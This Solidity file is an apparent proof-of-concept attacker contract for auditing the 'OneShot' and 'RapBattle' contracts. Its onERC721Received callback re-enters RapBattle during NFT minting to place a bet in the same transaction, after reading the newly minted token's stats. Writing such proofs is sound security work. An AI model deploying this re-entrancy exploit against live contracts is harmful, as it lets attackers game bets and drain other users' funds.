// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {OneShot} from "../src/OneShot.sol";
import {RapBattle} from "../src/RapBattle.sol";
import {console} from "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackerContract is IERC721Receiver {
    OneShot public oneShotContract;
    RapBattle public rapBattleContract;
    uint256 public amountBet;

    uint256 count;

    constructor(address _oneShotContract, address _rapBattle) {
        oneShotContract = OneShot(_oneShotContract);
        rapBattleContract = RapBattle(_rapBattle);
    }

    function attack(uint256 _amountBet) public {
        amountBet = _amountBet;
        oneShotContract.mintRapper();

    }

    // Implementing IERC721Receiver so the contract can accept ERC721 tokens
    function onERC721Received(address, address, uint256 id, bytes calldata) external override returns (bytes4) {
        OneShot.RapperStats memory rapperStats = oneShotContract.getRapperStats(id);
        console.log("Attacker weakKnees: %s", rapperStats.weakKnees);
        console.log("Attacker weakKnees: %s", rapperStats.weakKnees);
        console.log("Attacker weakKnees: %s", rapperStats.weakKnees);
        rapBattleContract.goOnStageOrBattle(id, amountBet);

  
        return IERC721Receiver.onERC721Received.selector;
    }
}
